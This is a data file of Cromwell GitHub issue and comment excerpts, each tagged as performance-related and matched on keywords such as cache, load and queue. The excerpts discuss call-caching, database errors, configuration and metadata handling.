workflows.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4234:617,load,load,617,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4234,4,['load'],"['load', 'loadUsingSource']"
Performance,"Number of times an I/O operation should be attempted before giving up and failing it.; #number-of-attempts = 5; }. # Maximum number of input file bytes allowed in order to read each type.; # If exceeded a FileSizeTooBig exception will be thrown.; input-read-limits {; #lines = 128000; #bool = 7; #int = 19; #float = 50; #string = 128000; #json = 128000; #tsv = 128000; #map = 128000; #object = 128000; }. abort {; # These are the default values in Cromwell, in most circumstances there should not be a need to change them. # How frequently Cromwell should scan for aborts.; scan-frequency: 30 seconds. # The cache of in-progress aborts. Cromwell will add entries to this cache once a WorkflowActor has been messaged to abort.; # If on the next scan an 'Aborting' status is found for a workflow that has an entry in this cache, Cromwell will not ask; # the associated WorkflowActor to abort again.; cache {; enabled: true; # Guava cache concurrency.; concurrency: 1; # How long entries in the cache should live from the time they are added to the cache.; ttl: 20 minutes; # Maximum number of entries in the cache.; size: 100000; }; }. # Cromwell reads this value into the JVM's `networkaddress.cache.ttl` setting to control DNS cache expiration; dns-cache-ttl: 3 minutes; }. docker {; hash-lookup {; # Set this to match your available quota against the Google Container Engine API; #gcr-api-queries-per-100-seconds = 1000. # Time in minutes before an entry expires from the docker hashes cache and needs to be fetched again; #cache-entry-ttl = ""20 minutes"". # Maximum number of elements to be kept in the cache. If the limit is reached, old elements will be removed from the cache; #cache-size = 200. # How should docker hashes be looked up. Possible values are ""local"" and ""remote""; # ""local"": Lookup hashes on the local docker daemon using the cli; # ""remote"": Lookup hashes on docker hub, gcr, gar, quay; #method = ""remote""; enabled = ""false""; }; }. # Here is where you can define the backend provi",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6933:3664,concurren,concurrency,3664,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6933,3,"['cache', 'concurren']","['cache', 'concurrency']"
Performance,"OFormatParser.parse(OBOFormatParser.java:235) org.semanticweb.owlapi.oboformat.OBOFormatOWLAPIParser.parse(OBOFormatOWLAPIParser.java:44) uk.ac.manchester.cs.owl.owlapi.OWLOntologyFactoryImpl.loadOWLOntology(OWLOntologyFactoryImpl.java:193) uk.ac.manchester.cs.owl.owlapi.OWLOntologyManagerImpl.load(OWLOntologyManagerImpl.java:1071) -------------------------------------------------------------------------------- Parser: org.semanticweb.owlapi.krss2.parser.KRSS2OWLParser@5326aaf7 Stack trace: org.semanticweb.owlapi.krss2.parser.ParseException: Encountered unexpected token: ""<?xml version=\""1.0\""?>"" "">"" at line 1, column 1. Was expecting: <EOF> org.semanticweb.owlapi.krss2.parser.KRSS2OWLParser.parse(KRSS2OWLParser.java:248) uk.ac.manchester.cs.owl.owlapi.OWLOntologyFactoryImpl.loadOWLOntology(OWLOntologyFactoryImpl.java:193) uk.ac.manchester.cs.owl.owlapi.OWLOntologyManagerImpl.load(OWLOntologyManagerImpl.java:1071) uk.ac.manchester.cs.owl.owlapi.OWLOntologyManagerImpl.loadOntology(OWLOntologyManagerImpl.java:1033) uk.ac.manchester.cs.owl.owlapi.OWLOntologyManagerImpl.loadOntologyFromOntologyDocument(OWLOntologyManagerImpl.java:974) cwl.ontology.Schema$.$anonfun$loadOntologyFromIri$5(Schema.scala:155) cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:85) cats.effect.internals.IORunLoop$RestartCallback.signal(IORunLoop.scala:336) cats.effect.internals.IORunLoop$RestartCallback.apply(IORunLoop.scala:357) cats.effect.internals.IORunLoop$RestartCallback.apply(IORunLoop.scala:303) Encountered unexpected token: ""<?xml version=\""1.0\""?>"" "">"" at line 1, column 1. Was expecting: <EOF> org.semanticweb.owlapi.krss2.parser.KRSS2Parser.generateParseException(KRSS2Parser.java:2103) org.semanticweb.owlapi.krss2.parser.KRSS2Parser.jj_consume_token(KRSS2Parser.java:1968) org.semanticweb.owlapi.krss2.parser.KRSS2Parser.parse(KRSS2Parser.java:124) org.semanticweb.owlapi.krss2.parser.KRSS2OWLParser.parse(KRSS2OWLParser.java:245) uk.ac.manchester.cs.ow",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4372:7086,load,loadOntology,7086,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4372,1,['load'],['loadOntology']
Performance,"OK slight change of plan: execution bucket call cache hints will be opt-in for now via workflow options with no changes required in Cromwell config. This actually does not have to be PAPI specific so the proposed nomenclature would be more general:. ```json; {; call_cache_hit_path_prefixes: [ ""gs://bucket-full-o-cache-hits"", ""gs://another-bucket-o-cache-hits"" ]; }; ```. ""opt-in"" here means that for now the caller would be responsible for specifying the prefixes by which to filter cache hits. If no prefixes are specified Cromwell will do no cache hit filtering. Backends have the ability to specify a root execution path to prepend to this list. For now this root execution path would only be prepended by PAPI since that's the only backend for which a sensible root could be determined by inspection (i.e. the GCS bucket). The number of prefixes in this list would be limited, for now I'm arbitrarily choosing 3 total. @ruchim",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4019:48,cache,cache,48,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4019,5,['cache'],"['cache', 'cache-hits']"
Performance,"OM)\n# https://askubuntu.com/a/823798\ntail /dev/zero"",; ""shardIndex"": -1,; ""jes"": {; ""endpointUrl"": ""https://lifesciences.googleapis.com/"",; ""machineType"": ""custom-1-2048"",; ""googleProject"": ""encode-dcc-1016"",; ""monitoringScript"": ""gs://caper-data/scripts/resource_monitor/resource_monitor.sh"",; ""executionBucket"": ""gs://encode-pipeline-test-runs/caper_out_10"",; ""zone"": ""us-central1-b"",; ""instanceName"": ""google-pipelines-worker-ead27fbad8aa73b157bfc126cd63331f""; },; ""runtimeAttributes"": {; ""preemptible"": ""0"",; ""failOnStderr"": ""false"",; ""bootDiskSizeGb"": ""10"",; ""disks"": ""local-disk 10 SSD"",; ""continueOnReturnCode"": ""[0,137]"",; ""docker"": ""ubuntu:latest"",; ""maxRetries"": ""1"",; ""cpu"": ""1"",; ""cpuMin"": ""1"",; ""noAddress"": ""false"",; ""zones"": ""us-central1-b"",; ""memoryMin"": ""2 GB"",; ""memory"": ""2 GB""; },; ""callCaching"": {; ""allowResultReuse"": true,; ""hit"": false,; ""result"": ""Cache Miss"",; ""hashes"": {; ""output count"": ""CFCD208495D565EF66E7DFF9F98764DA"",; ""runtime attribute"": {; ""failOnStderr"": ""68934A3E9455FA72420237EB05902327"",; ""docker"": ""A84529F7A095541F1249576699F24AA1"",; ""continueOnReturnCode"": ""614DAABB2D7AAB5D41921614A49E4F92""; },; ""input count"": ""CFCD208495D565EF66E7DFF9F98764DA"",; ""backend name"": ""50F66ECBC45488EE5826941BFBC50411"",; ""command template"": ""F41FEBA57D556A16A5F6C4EEF68ED1E0""; },; ""effectiveCallCachingMode"": ""ReadAndWriteCache""; },; ""inputs"": {},; ""backendLabels"": {; ""wdl-task-name"": ""fail-oom"",; ""cromwell-workflow-id"": ""cromwell-87492280-9828-4afa-b53e-bec675103c42""; },; ""labels"": {; ""wdl-task-name"": ""fail_oom"",; ""cromwell-workflow-id"": ""cromwell-87492280-9828-4afa-b53e-bec675103c42""; },; ""failures"": [; {; ""causedBy"": [],; ""message"": ""The compute backend terminated the job. If this termination is unexpected, examine likely causes such as preemption, running out of disk or memory on the compute instance, or exceeding the backend's maximum job duration.""; }; ],; ""jobId"": ""projects/99884963860/locations/us-central1/operations/1374639517116411519"",; ""monitoringLo",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5815:4207,Cache,Cache,4207,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5815,1,['Cache'],['Cache']
Performance,"Oh I see, insertion order in a map is definitely NOT preserved currently. They're backed by a classic unsorted HashMap. There would probably be performance implications if we were to switch to LinkedHashMap or a TreeMap to preserve order but maybe a `sort` function on arrays could make this easier.; Tagging @cjllanwarne who might want to chime in as this relates cloesly to WDL.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3314#issuecomment-368531271:144,perform,performance,144,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3314#issuecomment-368531271,1,['perform'],['performance']
Performance,"Oh, this part is not essential to the basic suggestion, but since we put our outputs someplace else after the workflow finishes, it would also be nice not to keep them in the execution folder, but instead refer to their new locations for cache eligibility purposes. Not essential, because even just getting rid of our multiple large intermediate files would make caching more feasible.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4064#issuecomment-417458574:238,cache,cache,238,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4064#issuecomment-417458574,1,['cache'],['cache']
Performance,"Ok, now a legit PR. @mcovarr does your thumb still hold? Changes were fairly minimal since you looked but feel free to comment. @Horneth you already did some digging and some of the followup changes involved pulling in your call cache 404 stuff, can you take a look?. @ruchim can you take a look at your label stuff?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2380#issuecomment-311795514:229,cache,cache,229,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2380#issuecomment-311795514,1,['cache'],['cache']
Performance,"Ok, so validation fails because I had a typo in my input variable name, fine. But TELL ME WHICH VARIABLE IT WAS!!!. The rest of this description is an example:. ```; workflow foo {; 	call bar; 	# Oops, bar didn't have an output called b:; 	call baz as bad_output_name { input: b = bar.b }; 	# Oops, baz doesn't have an input called a:; 	call baz as bad_input_name { input: a = bar.a }; }. task bar {; 	command {; 		# noop; 	}; 	output {; 		String a = ""a""; 	}; 	runtime {; 		docker: ""ubuntu:latest""; 	}; }. task baz {; 	String b; 	command {; 		# noop; 	}; 	runtime {; 		docker: ""ubuntu:latest""; 	}; }; ```. The messages I actually get:; ```; Unable to load namespace from workflow: ERROR: Expression references input on call that doesn't exist (line 4, col 47):. 	call baz as bad_output_name { input: b = bar.b }; ^; Unable to load namespace from workflow: ERROR: Call references an input on task 'baz' that doesn't exist (line 6, col 38). 	call baz as bad_input_name { input: a = bar.a }; ^; ```. The message I want:; ```; Unable to load namespace from workflow: ERROR: Cannot use 'bar.b' as an input. That variable was never created. (line 4, col 47):. 	call baz as bad_output_name { input: b = bar.b }; ^; Unable to load namespace from workflow: ERROR: Call supplies an input 'a' that isn't declared in the 'baz' task (line 6, col 38). 	call baz as bad_input_name { input: a = bar.a }; ^; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2211:651,load,load,651,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2211,4,['load'],['load']
Performance,"Okay preliminary testing. On a workflow that creates multiple jobs at once I get these errors: `Failure writing to call cache: [SQLITE_BUSY] the database file is locked (database is locked)`. This has to do probably with SQLITE not supporting multiple threads or something similar. It is probably reproducible by creating a mock scatter workflow that spawns a 1000 jobs at once. To reproduce; ```WDL; version 1.0. workflow thousand_scatters {; input {}; scatter (i in range(200)) {; call hello_world {input: hello=i}; }; output {; Array[String] hellos = hello_world.out; }; }. task hello_world {; input {; String hello = ""world"" ; }; command {; echo ""Hello ~{hello}!""; }; output {; String out = stdout(); }; runtime {; docker: ""quay.io/biocontainers/samtools:1.11--h6270b1f_0""; }; }; ```. With config; ```hocon; database {; profile = ""slick.jdbc.SQLiteProfile$""; db {; driver = ""org.sqlite.JDBC""; url = ""jdbc:sqlite:cromwell.sqlite?foreign_keys=true&date_class=text""; numThreads=1; }; }; call-caching {; enabled=true; }; ```. I already tried if running only one akka thread would solbe it with:; ```hocon; akka {; actor.default-dispatcher.fork-join-executor {; parallelism-max = 1; }; }. ```; But this had no effect. I still get:; ```[ERROR] [11/27/2020 13:47:06.907] [cromwell-system-akka.dispatchers.engine-dispatcher-3] [akka://cromwell-system/user/SingleWorkflowRunnerActor/WorkflowManagerActor/WorkflowActor-9f19cf8b-7b86-4c9d-9c90-0aa23817636c/WorkflowExecutionActor-9f19cf8b-7b86-4c9d-9c90-0aa23817636c/9f19cf8b-7b86-4c9d-9c90-0aa23817636c-EngineJobExecutionActor-thousand_scatters.hello_world:85:1] 9f19cf8b:thousand_scatters.hello_world:85:1: Failure writing to call cache: [SQLITE_BUSY] The database file is locked (database is locked)```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-734786140:120,cache,cache,120,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-734786140,2,['cache'],['cache']
Performance,"Okay so my understanding of this so far (I'm just reiterating what you have in your diagram for my own benefit):. `ShadowWorkflowActor` has 4 ""lifecycle"" states as actors:; - `MaterializeWorkflowDescriptorActor` - basic validation and `WorkflowDescriptor` creation; - `EngineWorkflowInitializationActor` - spawns 1 or more `BackendWorkflowInitializationActor`, then aggregates results from all of these and message back `ShadowWorkflowActor`; - `EngineWorkflowExecutionActor` - sent a Start or Restart message, performs the execution, sends back result of execution. Spawns `BackendWorkflowExecutionActor`s; - `EngineWorkflowFinalizationActor` - do post-workflow termination actions. Spawns `BackendWorkflowFinalizationActor`s. _I'm just thinking out loud here... if you think this is stupid, I won't feel bad if you ignore me_. I guess the only comments on this scheme are about naming... . I feel like `MaterializeWorkflowDescriptorActor` should follow the same naming scheme and maybe be called something like `EngineWorkflowDescriptorActor` or `EngineWorkflowParserActor`. I'm also not a huge fan of prepending `Engine` onto these actors... maybe we can just drop `Engine`?; - `WorkflowDescriptorActor`; - `WorkflowInitializationActor`; - `WorkflowExecutionActor`; - `WorkflowFinalizationActor`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/688#issuecomment-209515545:511,perform,performs,511,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/688#issuecomment-209515545,1,['perform'],['performs']
Performance,"Okay, thank you so much for the answer. In this case, then, I would ask if using. `docker-image-cache-manifest-file = ""gs://xxxxx-xxxxx/xxxxx.json""`. is it possible to achieve acceleration in Google Life Sciences or is it possible to use this cache method only for acceleration when running on the local backend?. I am thinking of such a solution, do you think it is in line with cromwell's good practices? -> distribute calculations according to whether I estimate they will be heavy and if so send them to google life sciences for calculation and if not calculate them on the local backend?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6462#issuecomment-893427880:96,cache,cache-manifest-file,96,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6462#issuecomment-893427880,2,['cache'],"['cache', 'cache-manifest-file']"
Performance,"Okay. So initially, I was passing the `ServiceRegistryActor` reference via props down the chain of actors, and each of the actors needed to follow a pattern of steps to insert into the metadata (e.g. create a `MetadataEvent` with a `MetadataPutAction` within which the `Metadata[Key, Value]` resided, send this message over to the the service registry, and handle failures, if any. It did not look good by any stretch IMO. All the metadata generating entities needed to be aware of the `MetadataService` (the erstwhile dataAcess). **Edit:** Using the above design in-fact now. ~~Currently, what I've done below is create a single instance of the `ServiceRegistryActor` in the `WorkflowManagerActor`and then create a `WorkflowProfilerActor` (one per workflow) which is supposed to handle all the metadata information coming from the engine side for a particular workflow. The way it happens is based on the presumption that almost all the information that we needed was present in the `StateName` and `StateData` of our FSMs. Unfortunately, with Akka's `SubscribeTransitionalCallback` we can only monitor the FSM states, and not the data. So I've created a trait (which the Engine's FSMs can extend from) which provide the semantics of wrapping up the state and data of the FSM in a message, and publish it into Akka's event stream. The ProfilerActor is the listener of these events and handles them appropriately. With this, I was able to make the FSMs unaware of the MetadataServices, and simply publish it's state and data in the event stream while performing any transitions.~~. ~~Let me know if you guys have any (other?) ideas / suggestions.~~. Contents added to metadata with this PR:; - [x] workflowName; - [ ] calls (To come from the backends); - [x] outputs ; - [x] id; - [x] inputs; - [x] submission; - [x] status; - [x] end; - [x] start",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/829:1551,perform,performing,1551,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/829,1,['perform'],['performing']
Performance,"Okay. So initially, I was passing the `ServiceRegistryActor` reference via props down the chain of actors, and each of the actors needed to follow a pattern of steps to insert into the metadata (e.g. create a `MetadataEvent` with a `MetadataPutAction` within which the `Metadata[Key, Value]` resided, send this message over to the the service registry, and handle failures, if any. It did not look good by any stretch IMO. All the metadata generating entities needed to be aware of the `MetadataService` (the erstwhile dataAcess). Currently, what I've done below is create a single instance of the `ServiceRegistryActor` in the `WorkflowManagerActor`and then create a `WorkflowProfilerActor` (one per workflow) which is supposed to handle all the metadata information coming from the engine side for a particular workflow. The way it happens is based on the presumption that almost all the information that we needed was present in the `StateName` and `StateData` of our FSMs. Unfortunately, with Akka's `SubscribeTransitionalCallback` we can only monitor the FSM states, and not the data. So I've created a trait (which the Engine's FSMs can extend from) which provide the semantics of wrapping up the state and data of the FSM in a message, and publish it into Akka's event stream. The ProfilerActor is the listener of these events and handles them appropriately. With this, I was able to make the FSMs unaware of the MetadataServices, and simply publish it's state and data in the event stream while performing any transitions. . Let me know if you guys have any (other?) ideas / suggestions. Edit: Names of new actors might be pretty bad IMO. Please suggest better ones if you have any. _P.S. : Currently based out of the Chris's branch since his metadata changes were needed._; _P.P.S. : Still a WIP for improving some stuff._",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/822:1503,perform,performing,1503,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/822,1,['perform'],['performing']
Performance,"On Cromwell version, ""34-5156b78-SNAP"", when making a request to the query endpoint that includes the `""includeSubworkflows"": ""false""` parameter, the database will throw an error if the query matches ~1000 results. . Example POST request:; ```; curl -X POST ""https://cromwell.caas-dev.broadinstitute.org/api/workflows/v1/query"" -H ""accept: application/json"" -H ""authorization: Bearer XXXXX"" -H ""Content-Type: application/json"" -d ""[ { \""status\"": \""Failed\"", \""includeSubworkflows\"": \""false\"" }]""; ```; Error message:; ```; {; ""status"": ""fail"",; ""message"": ""Task slick.basic.BasicBackend$DatabaseDef$$anon$2@27386688 rejected from slick.util.AsyncExecutor$$anon$2$$anon$1@2e52a800[Running, pool size = 200, active threads = 200, queued tasks = 999, completed tasks = 16375]""; }; ```; This error is very similar to the other issue: https://github.com/broadinstitute/cromwell/issues/3115; but `includeSubworkflows` shouldn't limit the number of results the `/query` endpoint can handle.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3873:730,queue,queued,730,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3873,1,['queue'],['queued']
Performance,"On cromwell version 30.1, when making a request to the query endpoint that includes an `additionalQueryResultFields` parameter, the database will throw an error if the query matches ~1000 results. This seems to be because cromwell is querying the db to get that field's value for each workflow in the result set. Example GET request:; ""https://cromwell.mint-dev.broadinstitute.org/api/workflows/v1/query?additionalQueryResultFields=parentWorkflowId"". Error message: ; ```{; ""status"": ""fail"",; ""message"": ""Task slick.basic.BasicBackend$DatabaseDef$$anon$2@349b84c3 rejected from slick.util.AsyncExecutor$$anon$2$$anon$1@37b87f04[Running, pool size = 200, active threads = 200, queued tasks = 1000, completed tasks = 3928972]""; }; ```. This does not occur when paginating the results (as long as the page size is not 1000+)",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3115:676,queue,queued,676,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3115,1,['queue'],['queued']
Performance,"On develop Cromwell running locally with local MySQL, this WDL takes about 30 seconds to write 400,050 metadata rows. Does this need to be more performant than that? Perhaps the problem before was a lack of batched DB writes?. ```; task IntToIntArray {; Int number. command <<<; python <<CODE; for i in range(${number}):; print(i); CODE; >>>. runtime {; docker: ""python@sha256:bda277274d53484e4026f96379205760a424061933f91816a6d66784c5e8afdf""; memory: ""1 GB""; preemptible: 2; }. output {; Array[Int] array = read_lines(stdout()); }; }. workflow wide {; call IntToIntArray { input: number = 200000 }; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1776#issuecomment-295922229:144,perform,performant,144,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1776#issuecomment-295922229,1,['perform'],['performant']
Performance,"Once I implemented a cache locally the workflow runs to Succeeded, but then the Centaur test fails because it's configured to expect workflowfailure. Judging by the fact that this test was part of [Tyburn](https://github.com/broadinstitute/tyburn/pull/27/files) which I believe lacked support for asserting failures, I don't think this is the correct expectation.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/955#issuecomment-224117892:21,cache,cache,21,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/955#issuecomment-224117892,1,['cache'],['cache']
Performance,"One new mode of backpressuring, some tweaks to the existing backpressuring, and several config value changes. The new backpressuring mode involves looking at the creation times of I/O command being dequeued from the I/O queue for processing and comparing them to a staleness threshold. If the commands are found to be stale, variable backpressure will be applied between lower and upper limits.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6460:220,queue,queue,220,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6460,1,['queue'],['queue']
Performance,"One of the biggest pain-points in FireCloud is the inability to see how much memory a tool used, thus making it hard to optimize memory requests. It would be awesome if `monitoring_script` could be a runtime attribute as well as a workflow option to enable memory profiling.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2990:120,optimiz,optimize,120,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2990,1,['optimiz'],['optimize']
